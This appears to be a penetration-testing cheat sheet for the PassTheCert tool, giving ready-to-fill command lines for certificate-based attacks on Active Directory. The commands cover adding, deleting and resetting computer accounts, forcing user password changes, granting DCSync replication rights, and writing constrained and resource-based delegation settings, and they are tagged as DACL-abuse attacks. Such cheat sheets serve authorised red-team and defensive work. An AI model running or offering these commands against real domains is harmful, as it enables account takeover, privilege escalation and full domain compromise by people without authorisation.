# passthecert

% certificate, windows, Active directory, shadow credential, rbcd, dcsync, pkinit, certificate

## download
```
https://github.com/AlmondOffSec/PassTheCert
```

## doc
```
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
```


## Computer mgt - add (windows)
#plateform/windows #target/remote  #cat/UTILS
```powershell
.\PassTheCert.exe --server ad1.contoso.com --cert-path Z:\ad2.pfx --add-computer --computer-name DESKTOP-1337$
```


## ldapshell  (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE

```bash
passthecert.py -action ldap-shell -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip>
```

## Computer mgt - add (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
```bash
passthecert.py -action add_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Jubeaz123+->
```

## Computer mgt - del (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
```bash
passthecert.py -action del_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ 
```

## Computer mgt - change password (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
```bash
passthecert.py -action modify_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -computer-pass <password|Jubeaz123+->
```

## User mgt - change password (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
```bash
passthecert.py -action forcePWDchange -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -target user_sam -new-pass <password|Jubeaz123+->
```

## User mgt - DCSYNC (linux)
 ```bash
passthecert.py -action modify_user -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -target <user> -elevate
 ```
 
 ## constrained delegation - add (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
```bash
passthecert.py -action add_computer -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -computer-name <computer_name|Jubeaz>$ -delegated-services <spn1>,<spn2>
```

## rbcd - add (linux)
#plateform/linux #target/remote  #cat/ATTACK/AD/DACL-ABUSE
Write new SIDs to the msDS-AllowedToActOnBehalfOfOtherIdentity

```bash
passthecert.py -action write_rbcd -crt <certficcate>.crt -key <certficcate>.key -domain <domain> -dc-ip <dc_ip> -delegate-to <target>$ -delegate-from <computer_name|Jubeaz>$
```